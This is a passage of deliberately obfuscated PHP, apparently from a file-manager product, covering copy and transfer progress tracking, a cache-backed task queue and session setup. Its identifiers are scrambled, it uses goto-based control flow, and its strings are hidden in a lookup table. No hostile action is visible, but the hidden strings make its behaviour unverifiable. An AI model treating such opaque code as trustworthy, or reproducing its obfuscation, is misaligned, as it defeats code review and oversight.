$e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1601]] = 0; $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1602]] = 0; if (!$e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1452]]) { $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1452]] = LNG($EÌ‡íáÚ‘ø[1603]); } goto eëÌ¦Å¨ò„; C•Üš‚›‡”: $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1595]] = LNG($EÌ‡íáÚ‘ø[1596]); $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1597]] = 0; $e×—¶ÜÓ“Í[$EÌ‡íáÚ‘ø[1598]] = 0; goto C×Ä¢Ó–ª; F‘ğ‚¹íóİ: Hook::bind($EÌ‡íáÚ‘ø[1589], array($this, $EÌ‡íáÚ‘ø[1590])); Hook::bind($EÌ‡íáÚ‘ø[1591], array($this, $EÌ‡íáÚ‘ø[1592])); Hook::bind($EÌ‡íáÚ‘ø[1593], array($this, $EÌ‡íáÚ‘ø[1594])); goto C•Üš‚›‡”; aÃòÒ½™ÕÍ: $EÌ‡íáÚ‘ø =& $_SERVER[œÕÊİğö]; $e×—¶ÜÓ“Í =& $this->task; $this->sourceCopyFolder = !1; goto e‹ÍÏºÇÒ–; eëÌ¦Å¨ò„: } protected function endAfter() { goto d™ˆÃÉÅõ†; d™ˆÃÉÅõ†: $F®Ç”Ğšçë =& $_SERVER[œÕÊİğö]; Hook::unbind($F®Ç”Ğšçë[1577], array($this, $F®Ç”Ğšçë[1578])); Hook::unbind($F®Ç”Ğšçë[1132], array($this, $F®Ç”Ğšçë[1579])); goto c¶ô¼Óªù‘; bóíÏöïğ: Hook::unbind($F®Ç”Ğšçë[1589], array($this, $F®Ç”Ğšçë[1590])); Hook::unbind($F®Ç”Ğšçë[1591], array($this, $F®Ç”Ğšçë[1592])); Hook::unbind($F®Ç”Ğšçë[1593], array($this, $F®Ç”Ğšçë[1594])); goto EÈ•††›ËŠ; Då¯ñöİæ: Hook::unbind($F®Ç”Ğšçë[604], array($this, $F®Ç”Ğšçë[1584])); Hook::unbind($F®Ç”Ğšçë[605], array($this, $F®Ç”Ğšçë[1584])); Hook::unbind($F®Ç”Ğšçë[571], array($this, $F®Ç”Ğšçë[1585])); goto bá­ï¤ ù; c¶ô¼Óªù‘: Hook::unbind($F®Ç”Ğšçë[1580], array($this, $F®Ç”Ğšçë[1581])); Hook::unbind($F®Ç”Ğšçë[601], array($this, $F®Ç”Ğšçë[1582])); Hook::unbind($F®Ç”Ğšçë[602], array($this, $F®Ç”Ğšçë[1583])); goto Då¯ñöİæ; bá­ï¤ ù: Hook::unbind($F®Ç”Ğšçë[568], array($this, $F®Ç”Ğšçë[1585])); Hook::unbind($F®Ç”Ğšçë[573], array($this, $F®Ç”Ğšçë[1585])); Hook::unbind($F®Ç”Ğšçë[575], array($this, $F®Ç”Ğšçë[1585])); goto CÍ®éŠ¼Ï; CÍ®éŠ¼Ï: Hook::unbind($F®Ç”Ğšçë[577], array($this, $F®Ç”Ğšçë[1585])); Hook::unbind($F®Ç”Ğšçë[1586], array($this, $F®Ç”Ğšçë[1587])); Hook::unbind($F®Ç”Ğšçë[594], array($this, $F®Ç”Ğšçë[1588])); goto bóíÏöïğ; EÈ•††›ËŠ: } public function copyMoveStart($Eˆ¬‡¾ƒÂŒ, $F¶Œ¿ËÀÙÆ, $B¨Œ¹ÒŞ¾Ó, $CâŸ¥ ëà­) { goto EĞø¸‚øñ‡; EĞø¸‚øñ‡: $A÷¾ÓØÅ†Ö =& $_SERVER[œÕÊİğö]; self::log($A÷¾ÓØÅ†Ö[1604] . $F¶Œ¿ËÀÙÆ . $A÷¾ÓØÅ†Ö[77] . $CâŸ¥ ëà­); $CÆÙÇ­À™ = rtrim(TEMP_FILES, $A÷¾ÓØÅ†Ö[8]); goto bò‘™Š°©; b”åÈ”òÃ×: $A¼ŠÎßØ[$A÷¾ÓØÅ†Ö[1605]] = KodIO::transferType($Eˆ¬‡¾ƒÂŒ, $B¨Œ¹ÒŞ¾Ó); $this->update(); goto c—£å•Ñ›Ò; bò‘™Š°©: if (substr($F¶Œ¿ËÀÙÆ, 0, strlen($CÆÙÇ­À™)) == $CÆÙÇ­À™) { return; } if (substr($CâŸ¥ ëà­, 0, strlen($CÆÙÇ­À™)) == $CÆÙÇ­À™) { return; } $A¼ŠÎßØ =& $this->task; goto b”åÈ”òÃ×; c—£å•Ñ›Ò: } public function updateAfter() { $eª¼ÇùËØ‰ =& $_SERVER[œÕÊİğö]; $f”æ’„¶Á =& $this->task; if (!$f”æ’„¶Á[$eª¼ÇùËØ‰[753]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($f”æ’„¶Á[$eª¼ÇùËØ‰[1605]] == $eª¼ÇùËØ‰[1205]) { return; } self::updateTask($f”æ’„¶Á); } private static function updateTask(&$CÆ…¤»Ô¤ ) { $e§Ø”“®ã† =& $_SERVER[œÕÊİğö]; if ($CÆ…¤»Ô¤ [$e§Ø”“®ã†[1605]] == $e§Ø”“®ã†[1116] || $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1605]] == $e§Ø”“®ã†[117]) { if ($CÆ…¤»Ô¤ [$e§Ø”“®ã†[1599]]) { $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1602]] = $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1601]] + $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1598]]; } } else { if ($CÆ…¤»Ô¤ [$e§Ø”“®ã†[1605]] == $e§Ø”“®ã†[1206]) { if ($CÆ…¤»Ô¤ [$e§Ø”“®ã†[1599]] == $e§Ø”“®ã†[1116]) { $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1602]] = $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1601]] + $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1598]] * 0.5; } else { if ($CÆ…¤»Ô¤ [$e§Ø”“®ã†[1599]] == $e§Ø”“®ã†[117]) { $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1602]] = $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1601]] + $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1597]] * 0.5 + $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1598]] * 0.5; } } } } $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1552]] = $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1602]] / $CÆ…¤»Ô¤ [$e§Ø”“®ã†[753]]; if ($CÆ…¤»Ô¤ [$e§Ø”“®ã†[1552]] > 0) { $B¼Çš–šç = timeFloat() - $CÆ…¤»Ô¤ [$e§Ø”“®ã†[779]] - $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1555]]; $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1556]] = $B¼Çš–šç * (1 - $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1552]]) / $CÆ…¤»Ô¤ [$e§Ø”“®ã†[1552]]; } } public function addPath($C¡”ì‘Œ±) { goto D’‚Ãˆİô; eÚ›å¹ÜÅ: $Cç†¾å·»Ô = IO::infoWithChildren($C¡”ì‘Œ±); $Cˆâ‘Â¡‹È = $d¦®¹‡Î§ô[$aô¬¾ƒ¸ŒÆ[1606]] ? $d¦®¹‡Î§ô[$aô¬¾ƒ¸ŒÆ[1606]][$aô¬¾ƒ¸ŒÆ[1607]] : 0; $d¦®¹‡Î§ô[$aô¬¾ƒ¸ŒÆ[1606]] = array($aô¬¾ƒ¸ŒÆ[1607] => $Cˆâ‘Â¡‹È + 1, $aô¬¾ƒ¸ŒÆ[424] => $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[38]], $aô¬¾ƒ¸ŒÆ[86] => $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[86]], $aô¬¾ƒ¸ŒÆ[522] => $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[522]] ? $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[522]] : $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[86]]); goto CÙÏŒŠ‡ïå; D’‚Ãˆİô: $aô¬¾ƒ¸ŒÆ =& $_SERVER[œÕÊİğö]; if (!$C¡”ì‘Œ±) { return; } $d¦®¹‡Î§ô =& $this->task; goto eÚ›å¹ÜÅ; CÙÏŒŠ‡ïå: if ($Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[39]] == $aô¬¾ƒ¸ŒÆ[203]) { $d¦®¹‡Î§ô[$aô¬¾ƒ¸ŒÆ[1044]] += 1; } else { $d¦®¹‡Î§ô[$aô¬¾ƒ¸ŒÆ[1044]] += $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[91]][$aô¬¾ƒ¸ŒÆ[89]]; if ($Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[406]]) { $d¦®¹‡Î§ô[$aô¬¾ƒ¸ŒÆ[1044]] += $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[91]][$aô¬¾ƒ¸ŒÆ[90]] + 1; } } $d¦®¹‡Î§ô[$aô¬¾ƒ¸ŒÆ[753]] += $Cç†¾å·»Ô[$aô¬¾ƒ¸ŒÆ[88]]; $this->update(); goto DÁŞÎÈ“„Œ; DÁŞÎÈ“„Œ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($F²ŸÔ”‹Œª) { $FÁáâÃ†è =& $_SERVER[œÕÊİğö]; $bÜÁ£´ËçÀ =& $this->task; $bÜÁ£´ËçÀ[$FÁáâÃ†è[1595]] = $F²ŸÔ”‹Œª[$FÁáâÃ†è[38]]; $bÜÁ£´ËçÀ[$FÁáâÃ†è[1046]] = $F²ŸÔ”‹Œª[$FÁáâÃ†è[38]]; $this->update(); } public function copyFileStart($b½ğø …Û, $e‚‚Ô…×æ, $EÄøÑ‘á¼£, $CÏØ„™‘Ú÷, $Fà—„´Ü‘´, $dæãô”¶£ì) { goto d§’ƒâá; A¾’£Å»³°: $GLOBALS[$aİÄô®í‚Ä[1609]] = $Fà—„´Ü‘´; $GLOBALS[$aİÄô®í‚Ä[1608]] = $dæãô”¶£ì; $c‘ïì–Å =& $this->task; goto BˆªŒ­—¿ ; fÁÜ™Û§¡: $añœßªÃƒ— = $c‘ïì–Å[$aİÄô®í‚Ä[1597]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($c‘ïì–Å[$aİÄô®í‚Ä[404]] . $aİÄô®í‚Ä[1610]); if ($añœßªÃƒ— && file_exists(get_path_father($CÏØ„™‘Ú÷))) { Cache::set($c‘ïì–Å[$aİÄô®í‚Ä[404]] . $aİÄô®í‚Ä[1610], $CÏØ„™‘Ú÷); $c‘ïì–Å[$aİÄô®í‚Ä[1570]] = array($aİÄô®í‚Ä[1611], $aİÄô®í‚Ä[1612]); } goto a‰’Åä†í¨; BˆªŒ­—¿ : $c‘ïì–Å[$aİÄô®í‚Ä[1595]] = $EíÔÄ´×Ï; $c‘ïì–Å[$aİÄô®í‚Ä[1597]] = (int) $b½ğø …Û->size($e‚‚Ô…×æ); $c‘ïì–Å[$aİÄô®í‚Ä[1598]] = 0; goto Aõ†Éó©ÃÅ; Aõ†Éó©ÃÅ: $c‘ïì–Å[$aİÄô®í‚Ä[1046]] = $aİÄô®í‚Ä[43]; $c‘ïì–Å[$aİÄô®í‚Ä[1599]] = $aİÄô®í‚Ä[43]; $c‘ïì–Å[$aİÄô®í‚Ä[1600]] = 0; goto fÁÜ™Û§¡; a‰’Åä†í¨: $this->update(0, $añœßªÃƒ—); goto BËçàŒÇ£‘; d§’ƒâá: $aİÄô®í‚Ä =& $_SERVER[œÕÊİğö]; $EíÔÄ´×Ï = $Fà—„´Ü‘´; if ($EíÔÄ´×Ï == $GLOBALS[$aİÄô®í‚Ä[1608]]) { $EíÔÄ´×Ï = $GLOBALS[$aİÄô®í‚Ä[1609]]; } goto A¾’£Å»³°; BËçàŒÇ£‘: } public static function updateCopyLocalFileSize($fº‰´Çˆñ¸) { goto dŞ¾§ªøì©; bØ‰ÖØ²¶Á: return $fº‰´Çˆñ¸; goto D¿á³•¨«; FÃÅˆàìõ…: $fº‰´Çˆñ¸[$bå‰Æ©„Şµ[1598]] = @filesize($C‘«àì‹); $fº‰´Çˆñ¸[$bå‰Æ©„Şµ[1602]] += $fº‰´Çˆñ¸[$bå‰Æ©„Şµ[1598]]; self::updateTask($fº‰´Çˆñ¸); goto bØ‰ÖØ²¶Á; dŞ¾§ªøì©: $bå‰Æ©„Şµ =& $_SERVER[œÕÊİğö]; $C‘«àì‹ = Cache::get($fº‰´Çˆñ¸[$bå‰Æ©„Şµ[404]] . $bå‰Æ©„Şµ[1610]); if (!$C‘«àì‹ || !file_exists($C‘«àì‹)) { return $fº‰´Çˆñ¸; } goto FÃÅˆàìõ…; D¿á³•¨«: } public function copyFileEnd($cåğ¦…è, $dƒ‘„‡®àÎ, $CÑô¤ßó›œ, $DêŠÁˆ„ã‚, $AåÄ„¡…äá, $Fáóæ‹›†) { goto EàÁÌ×³¼°; EàÁÌ×³¼°: $B……·„áÜ‹ =& $_SERVER[œÕÊİğö]; $FÃŞ¾ªôÜ½ =& $this->task; $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1598]] = $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1597]]; goto Eö‚‘„ã§à; eˆ²œùÜµ: Cache::remove($FÃŞ¾ªôÜ½[$B……·„áÜ‹[404]] . $B……·„áÜ‹[1610]); self::log($B……·„áÜ‹[1613] . $dƒ‘„‡®àÎ . $B……·„áÜ‹[77] . $DêŠÁˆ„ã‚ . $B……·„áÜ‹[15] . $AåÄ„¡…äá . $B……·„áÜ‹[1614] . $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1595]]); goto fã¶”ÀÄŸ; Eö‚‘„ã§à: $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1599]] = $B……·„áÜ‹[43]; unset($FÃŞ¾ªôÜ½[$B……·„áÜ‹[1570]]); if ($AåÄ„¡…äá == $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1595]]) { $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1601]] += $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1597]]; $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1602]] = $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1601]]; $this->update(1); } else { $this->update(); $FÃŞ¾ªôÜ½[$B……·„áÜ‹[1598]] = 0; } goto eˆ²œùÜµ; fã¶”ÀÄŸ: } public function updateFileEnd($aª—ÁÄâŠ¶, $E¯ÓÁ £âó) { goto a±ÏİÕšœ; D•¼³ê³Ú”: $DÄäš’‚¢º[$eã÷ÆĞÓ™â[1597]] = $E¯ÓÁ £âó; $DÄäš’‚¢º[$eã÷ÆĞÓ™â[1601]] += $E¯ÓÁ £âó; $DÄäš’‚¢º[$eã÷ÆĞÓ™â[1602]] = $DÄäš’‚¢º[$eã÷ÆĞÓ™â[1601]]; goto b¥Ó‚É‡¬š; b¥Ó‚É‡¬š: $this->update(1); self::log($eã÷ÆĞÓ™â[1615] . $aª—ÁÄâŠ¶); goto fòˆ„‡Şø³; a±ÏİÕšœ: $eã÷ÆĞÓ™â =& $_SERVER[œÕÊİğö]; $DÄäš’‚¢º =& $this->task; $DÄäš’‚¢º[$eã÷ÆĞÓ™â[1595]] = $aª—ÁÄâŠ¶; goto D•¼³ê³Ú”; fòˆ„‡Şø³: } public function sourceModelCopy($aÙÆ®‰é½µ) { goto bÔÎ™Ä¡ç; C”‚šæãŒ¶: $DÊÌ¬ÁÏ… =& $this->task; $this->sourceModelCopyFlag = !0; $d¥‹ù¦˜Õ² = 0; goto f‹ƒĞ‹ËÙÀ; f‹ƒĞ‹ËÙÀ: switch ($E‘Š×‚ÃØ„) { case $fºµ…÷­Ü[569]: $d¥‹ù¦˜Õ² = 1; break; case $fºµ…÷­Ü[572]: $DÊÌ¬ÁÏ…[$fºµ…÷­Ü[1595]] = $e„¬ò¤àµç[$fºµ…÷­Ü[38]]; break; case $fºµ…÷­Ü[574]: $d¥‹ù¦˜Õ² = intval($aÙÆ®‰é½µ[$fºµ…÷­Ü[387]] * 0.4); break; case $fºµ…÷­Ü[576]: $d¥‹ù¦˜Õ² = intval($aÙÆ®‰é½µ[$fºµ…÷­Ü[387]] * 0.2); break; case $fºµ…÷­Ü[578]: $d¥‹ù¦˜Õ² = intval($aÙÆ®‰é½µ[$fºµ…÷­Ü[387]] * 0.4); break; } $this->update($d¥‹ù¦˜Õ²); $this->sourceModelCopyFlag = !1; goto EÍë¸˜èŒ²; bÔÎ™Ä¡ç: $fºµ…÷­Ü =& $_SERVER[œÕÊİğö]; $E‘Š×‚ÃØ„ = $aÙÆ®‰é½µ[0]; $e„¬ò¤àµç = $aÙÆ®‰é½µ[1]; goto C”‚šæãŒ¶; EÍë¸˜èŒ²: } public function sourceRemove($Eªß¡£ôÜ÷, $a£‰´°¼¦Î) { $b¶Òîô„œ =& $_SERVER[œÕÊİğö]; $this->sourceModelCopyFlag = !0; $DŠ±ÑéŸ…² = 1; if (isset($Eªß¡£ôÜ÷[$b¶Òîô„œ[91]])) { $DŠ±ÑéŸ…² = $Eªß¡£ôÜ÷[$b¶Òîô„œ[91]][$b¶Òîô„œ[89]] + $Eªß¡£ôÜ÷[$b¶Òîô„œ[91]][$b¶Òîô„œ[90]] + 1; } $this->update($DŠ±ÑéŸ…²); $this->sourceModelCopyFlag = !1; } public function sourceMove($a’í½õô¸) { $this->sourceRemove($a’í½õô¸, !1); } public function curlProgress($FÁ¦…¼©£´, $d Ï´ ëÙ‹, $cÆ™ƒÂî·, $eÀË—‚“ƒÌ, $a’¬Ï¿Â´) { $fË§ñâŠˆ‘ =& $_SERVER[œÕÊİğö]; $A©¶™¹Í½Î =& $this->task; if ($a’¬Ï¿Â´ > 0) { $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1046]] = $fË§ñâŠˆ‘[1616]; $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1599]] = $fË§ñâŠˆ‘[117]; if ($A©¶™¹Í½Î[$fË§ñâŠˆ‘[1597]]) { $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1598]] = $a’¬Ï¿Â´; } if ($A©¶™¹Í½Î[$fË§ñâŠˆ‘[1600]]) { $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1598]] = $a’¬Ï¿Â´ + $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1600]]; } } else { if ($cÆ™ƒÂî· > 0) { if ($A©¶™¹Í½Î[$fË§ñâŠˆ‘[1597]] == $d Ï´ ëÙ‹) { $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1598]] = $cÆ™ƒÂî·; $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1046]] = $fË§ñâŠˆ‘[1617]; $A©¶™¹Í½Î[$fË§ñâŠˆ‘[1599]] = $fË§ñâŠˆ‘[1116]; } } } $this->update(); } public function curlProgressStart($A³æªŞÀù) { } public function curlProgressEnd($c®ºò÷ëå) { goto fçè‡Ì‡«Å; cœ·ÍÎ®õô: $this->update(); goto eÁ¹çÇÜ£İ; fçè‡Ì‡«Å: $C‡¦¶ÊƒË® =& $_SERVER[œÕÊİğö]; $c÷–©‰ëÕ• =& $this->task; $dÌÕÖï”¯Ç = curl_getinfo($c®ºò÷ëå); goto A™¼Õ•Æ´; A™¼Õ•Æ´: $dŠ™Š’Ğë = $dÌÕÖï”¯Ç[$C‡¦¶ÊƒË®[1618]]; if ($dŠ™Š’Ğë == -1) { $dŠ™Š’Ğë = $dÌÕÖï”¯Ç[$C‡¦¶ÊƒË®[1619]]; } if ($c÷–©‰ëÕ•[$C‡¦¶ÊƒË®[1599]] == $C‡¦¶ÊƒË®[117] && $dŠ™Š’Ğë) { $c÷–©‰ëÕ•[$C‡¦¶ÊƒË®[1600]] += $dŠ™Š’Ğë; } goto cœ·ÍÎ®õô; eÁ¹çÇÜ£İ: } } class TaskHttp extends Task { protected function startAfter() { $B¥º™›œ¨„ =& $_SERVER[œÕÊİğö]; $d˜Àƒ£Ö© =& $this->task; $d˜Àƒ£Ö©[$B¥º™›œ¨„[1620]] = 1; Hook::bind($B¥º™›œ¨„[1589], array($this, $B¥º™›œ¨„[1621])); Hook::bind($B¥º™›œ¨„[1591], array($this, $B¥º™›œ¨„[1622])); Hook::bind($B¥º™›œ¨„[1593], array($this, $B¥º™›œ¨„[1623])); } protected function endAfter() { $e½ßÊ«† =& $_SERVER[œÕÊİğö]; Hook::unbind($e½ßÊ«†[1589], array($this, $e½ßÊ«†[1621])); Hook::unbind($e½ßÊ«†[1591], array($this, $e½ßÊ«†[1622])); Hook::unbind($e½ßÊ«†[1593], array($this, $e½ßÊ«†[1623])); } public function progressStart($eƒ™½±ÆÍ¦) { $b×ÔĞ¿Š†† =& $_SERVER[œÕÊİğö]; $aˆ‚ ¤‘‚£ = curl_getinfo($eƒ™½±ÆÍ¦); self::log($b×ÔĞ¿Š††[1624] . $aˆ‚ ¤‘‚£[$b×ÔĞ¿Š††[315]]); self::valueSet($this->task[$b×ÔĞ¿Š††[404]], $this->task); } public function progressEnd($a§ùÅˆ—©) { $a´ùƒÂé†± =& $_SERVER[œÕÊİğö]; self::log($a´ùƒÂé†±[1625] . $this->task[$a´ùƒÂé†±[404]]); $this->end(); } public function progress($Aíß•‰È”í, $eï•·èÓ–, $CÆåò¬´¥Ç, $CÜó¸å¼Ô·, $cÂ¨åêÃ¼î) { $Dóè°ì¥× =& $_SERVER[œÕÊİğö]; $cÏğ–Ã÷Éİ =& $this->task; if ($cÂ¨åêÃ¼î > 0) { $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1044]] = $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1044]] == 0 ? $CÜó¸å¼Ô· : $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1044]]; $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1058]] = $cÂ¨åêÃ¼î; } else { if ($CÆåò¬´¥Ç > 0) { $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1044]] = $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1044]] == 0 ? $eï•·èÓ– : $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1044]]; $cÏğ–Ã÷Éİ[$Dóè°ì¥×[1058]] = $CÆåò¬´¥Ç; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\145\163\163\x48\x74\x74\160\x3a\144\157\167\156\72{$CÆåò¬´¥Ç}\57{$eï•·èÓ–}\x3b\x20\x75\160\154\157\141\x64\x3a{$cÂ¨åêÃ¼î}\x2f{$CÜó¸å¼Ô·}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\x65\165\145\x4c\x65\156\x67\164\150"; const QUEUE_DATA = "\164\x61\x73\153\121\165\x65\x75\x65\x44\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($a†£Á¶‘›Ê, $E²œ‘†æ¿Ú = array(), $Cá¨ÅÙŠ„í = '', $DÓ¸é²œÈ¿ = '') { $Eãºµ¨ =& $_SERVER[œÕÊİğö]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($DÓ¸é²œÈ¿ && array_find_by_field(self::$listData, $Eãºµ¨[103], $DÓ¸é²œÈ¿)) { return !0; } self::$listData[] = array($Eãºµ¨[272] => $a†£Á¶‘›Ê, $Eãºµ¨[1626] => $E²œ‘†æ¿Ú, $Eãºµ¨[454] => $Cá¨ÅÙŠ„í, $Eãºµ¨[103] => $DÓ¸é²œÈ¿); return !0; } public static function addSubmit() { $DøÉœíÅ× =& $_SERVER[œÕÊİğö]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($DøÉœíÅ×[1627] . json_encode_force(array_to_keyvalue(self::$listData, $DøÉœíÅ×[43], $DøÉœíÅ×[454])), $DøÉœíÅ×[1628]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($eäÎßßºÒˆ, $AõøõĞ¿¶¯ = array(), $AğåÍàë = '', $fœÃÂŒÁ° = '') { goto aß¶¨£ºÎ; CÖÓÕÑë»„: self::setAll($a”óŸƒÄ¹ù); return !0; goto e®ÙõÂ„ƒù; B‚ğöóîò: if ($fœÃÂŒÁ° && array_find_by_field($a”óŸƒÄ¹ù, $a¦Í‰•å±¬[103], $fœÃÂŒÁ°)) { return !0; } $a”óŸƒÄ¹ù[] = array($a¦Í‰•å±¬[272] => $eäÎßßºÒˆ, $a¦Í‰•å±¬[1626] => $AõøõĞ¿¶¯, $a¦Í‰•å±¬[454] => $AğåÍàë, $a¦Í‰•å±¬[103] => $fœÃÂŒÁ°); write_log($a¦Í‰•å±¬[1627] . $AğåÍàë, $a¦Í‰•å±¬[1628]); goto CÖÓÕÑë»„; aß¶¨£ºÎ: $a¦Í‰•å±¬ =& $_SERVER[œÕÊİğö]; if (self::count() >= self::MAX_LENGTH) { return !1; } $a”óŸƒÄ¹ù = self::getAll(); goto B‚ğöóîò; e®ÙõÂ„ƒù: } public static function run() { goto fË†ˆ˜‚º›; f²×á¬ÂïÊ: if (!$F¡Æîó¿ì) { return !1; } self::setAll($b«–‹‹ÔŒ¨); $Cç® ´„ÔÚ = timeFloat(); goto bæ‹¥¾Ÿ¶É; bæ‹¥¾Ÿ¶É: try { Hook::apply($F¡Æîó¿ì[$C×º²Œ˜ç·[272]], $F¡Æîó¿ì[$C×º²Œ˜ç·[1626]]); } catch (Exception $dÁÎÂÍö¿«) { } $b˜Ùßí©¿ = number_format(timeFloat() - $Cç® ´„ÔÚ, 3) . $C×º²Œ˜ç·[1564]; write_log($C×º²Œ˜ç·[1629] . $F¡Æîó¿ì[$C×º²Œ˜ç·[454]] . $C×º²Œ˜ç·[1630] . $b˜Ùßí©¿, $C×º²Œ˜ç·[1628]); goto Cßìİ¨Ø‘; fË†ˆ˜‚º›: $C×º²Œ˜ç· =& $_SERVER[œÕÊİğö]; $b«–‹‹ÔŒ¨ = self::getAll(); $F¡Æîó¿ì = array_shift($b«–‹‹ÔŒ¨); goto f²×á¬ÂïÊ; Cßìİ¨Ø‘: return !0; goto E‚¶²¹ƒù’; E‚¶²¹ƒù’: } public static function count() { $A“îÏªéÆ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$A“îÏªéÆ) { return 0; } return intval($A“îÏªéÆ); } public static function getAll() { $dŠâ•¨¸âì = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$dŠâ•¨¸âì) { return array(); } return $dŠâ•¨¸âì; } public static function setAll($aÜè¤Şó‰) { $A®’”£¸ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($aÜè¤Şó‰), $A®’”£¸); Cache::set(self::QUEUE_DATA, $aÜè¤Şó‰, $A®’”£¸); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto a¦¹ëï¯ÑÃ; bÔù¿éÌÀ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto B…áĞƒŒõ§; C¢÷¿÷æ‰Ñ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $EíÁ¸è­­ = new self(); return $EíÁ¸è­­; goto cÒ˜ÃŞçø; EŒ²Ç†ëÀã: $BùÓ©õã— = $B¡òÎĞ‡äë[$f»äà…—¢³]; $A“·œ…ìß = $B¡òÎĞ‡äë[$a©ãÇ¸Æšµ[825]]; switch ($f»äà…—¢³) { case $a©ãÇ¸Æšµ[27]: self::$handle = Model($a©ãÇ¸Æšµ[826]); break; case $a©ãÇ¸Æšµ[827]: self::$handle = new CacheRedis($BùÓ©õã—, $A“·œ…ìß); break; case $a©ãÇ¸Æšµ[828]: self::$handle = new CacheMemcached($BùÓ©õã—, $A“·œ…ìß); break; case $a©ãÇ¸Æšµ[203]: $BùÓ©õã—[$a©ãÇ¸Æšµ[86]] = $BùÓ©õã—[$a©ãÇ¸Æšµ[86]] . $a©ãÇ¸Æšµ[1513]; self::$handle = new CacheFile($BùÓ©õã—, $A“·œ…ìß); default: break; } goto C¢÷¿÷æ‰Ñ; A‡âİà„âÆ: if (self::$sessionSign) { } else { if (Cookie::get($eËæÛ„›…—)) { self::$sessionSign = Cookie::get($eËæÛ„›…—); } else { self::$sessionSign = guid(); } } Cookie::setSafe($eËæÛ„›…—, self::$sessionSign, self::$sessionTime); $f»äà…—¢³ = $B¡òÎĞ‡äë[$a©ãÇ¸Æšµ[1512]]; goto EŒ²Ç†ëÀã; f«áêÌ©Œ: $B¡òÎĞ‡äë = $GLOBALS[$a©ãÇ¸Æšµ[6]][$a©ãÇ¸Æšµ[357]]; self::$sessionTime = $B¡òÎĞ‡äë[$a©ãÇ¸Æšµ[1510]]; $eËæÛ„›…— = isset($GLOBALS[$a©ãÇ¸Æšµ[1511]]) ? $GLOBALS[$a©ãÇ¸Æšµ[1511]] : SESSION_ID; goto A‡âİà„âÆ; B…áĞƒŒõ§: $a©ãÇ¸Æšµ =& $_SERVER[œÕÊİğö]; static $EíÁ¸è­­ = false; if ($EíÁ¸è­­) { return $EíÁ¸è­­; } goto f«áêÌ©Œ; cÒ˜ÃŞçø: } public static function sign($e ŠÓÜ¹°ï = false) { $e ŠÓÜ¹°ï && (self::$sessionSign = $e ŠÓÜ¹°ï); 